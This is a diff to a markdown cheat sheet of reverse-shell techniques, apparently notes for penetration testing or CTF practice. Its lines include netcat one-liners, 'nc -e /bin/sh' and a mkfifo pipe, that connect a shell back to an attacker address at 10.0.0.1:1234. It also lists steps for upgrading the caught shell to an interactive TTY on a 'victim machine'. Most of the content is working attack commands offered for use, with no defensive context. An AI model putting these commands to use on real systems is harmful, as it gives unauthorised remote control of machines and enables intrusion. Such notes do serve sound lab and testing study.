@@ -1,4 +1,4 @@
-# Reverse shell
+## Reverse shell
 
 **1. Reverse shell list**  
 
@@ -19,7 +19,7 @@
 
 	Netcat  
 	nc -e /bin/sh 10.0.0.1 1234
-	(Really like this one)
+	(Netcat without -e flag)
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f 
 
 **== Upgrading half shells to fully interactive TTYs without closing nc session. ==**
@@ -34,8 +34,8 @@ echo $TERM     // on attacking machine
 sty raw echo   // attacking machine  
 fg             // attacking machine  
 reset          // attacking machine  
+export SHELL=BASH          //on victim machine	
 export TERM=xterm-256color //on victim machine  
-export SHELL=BASH          //on victim machine  
 stty rows 55 columns 205   //on victim machine. See stty -a  
 
 **TBC. Check which port is allowed for reverse shell** 
